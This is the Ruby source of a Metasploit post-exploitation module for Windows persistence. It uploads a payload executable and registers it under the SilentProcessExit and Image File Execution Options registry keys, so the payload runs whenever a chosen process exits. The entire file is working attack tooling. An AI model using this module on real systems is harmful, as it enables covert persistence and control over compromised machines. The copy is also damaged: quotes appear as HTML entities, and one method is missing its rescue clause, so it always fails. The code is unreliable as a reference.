# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/post/file&#039;
require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Registry
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Windows Silent Process Exit Persistence&#039;,
      &#039;Description&#039;    => %q(
      Windows allows you to set up a debug process when a process exits.
      This module uploads a payload and declares that it is the debug
      process to launch when a specified process exits.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mithun Shanbhag&#039;, # earliest author found
          &#039;bwatters-r7&#039;, # msf module
        ],
      &#039;Platform&#039;       => [ &#039;win&#039; ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => "Jun 28 2008",
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://attack.mitre.org/techniques/T1183/&#039;],
          [&#039;URL&#039;, &#039;https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; => &#039;true&#039;
        }
    ))
    register_options([
      OptString.new(&#039;PAYLOAD_NAME&#039;,
                    [false, &#039;The filename for the payload to be used on the target host (%RAND%.exe by default).&#039;, nil]),
      OptString.new(&#039;PATH&#039;, [false, &#039;Path to write payload(%TEMP% by default).&#039;, nil]),
      OptString.new(&#039;IMAGE_FILE&#039;, [true, &#039;Binary to "debug"&#039;, nil])

    ])
  end

  def upload_payload(dest_pathname)
    payload_exe = generate_payload_exe
    write_file(dest_pathname, payload_exe)
    vprint_status("Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo[&#039;Computer&#039;]} to #{dest_pathname}")
  end

  def validate_active_host
    unless is_system?
      fail_with(Failure::NoAccess, "You must be System to run this Module")
    end

    begin
      print_status("Attempting Persistence on #{sysinfo[&#039;Computer&#039;]} via session ID: #{datastore[&#039;SESSION&#039;]}")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      raise Msf::Exploit::Failed, &#039;Could not connect to session&#039;
    end
  end

  def write_reg_keys(image_file, payload_pathname)
    reg_keys = []
    reg_keys.push(key_name: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{image_file}",
                  value_name: "GlobalFlag",
                  type: "REG_DWORD",
                  value_value: 512)
    reg_keys.push(key_name: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{image_file}",
                   value_name: "ReportingMode",
                   type: "REG_DWORD",
                   value_value: 1)
    reg_keys.push(key_name: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{image_file}",
                   value_name: "MonitorProcess",
                   type: "REG_SZ",
                   value_value: payload_pathname)
    silent_process_exit_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"
    registry_createkey(silent_process_exit_key) unless registry_key_exist?(silent_process_exit_key)
    reg_keys.each do |key|
      registry_createkey(key[:key_name]) unless registry_key_exist?(key[:key_name])
      vprint_status("Writing #{key[:value_name]} to #{key[:key_name]}")
      registry_setvaldata(key[:key_name], key[:value_name], key[:value_value], key[:type])
      unless registry_getvalinfo(key[:key_name], key[:value_name])
        print_error("Failed to set #{key[:value_name]} for #{key[:key_name]}")
        return false
      end
    end
  end

  def exploit
    validate_active_host
    payload_name = datastore[&#039;PAYLOAD_NAME&#039;] || Rex::Text.rand_text_alpha((rand(8) + 6))
    temp_path = datastore[&#039;PATH&#039;] || session.sys.config.getenv(&#039;TEMP&#039;)
    image_file = datastore[&#039;IMAGE_FILE&#039;]
    payload_pathname = temp_path + "\\" + payload_name + &#039;.exe&#039;
    vprint_status("Payload pathname = #{payload_pathname}")
    upload_payload(payload_pathname) if write_reg_keys(image_file, payload_pathname)
  end
end

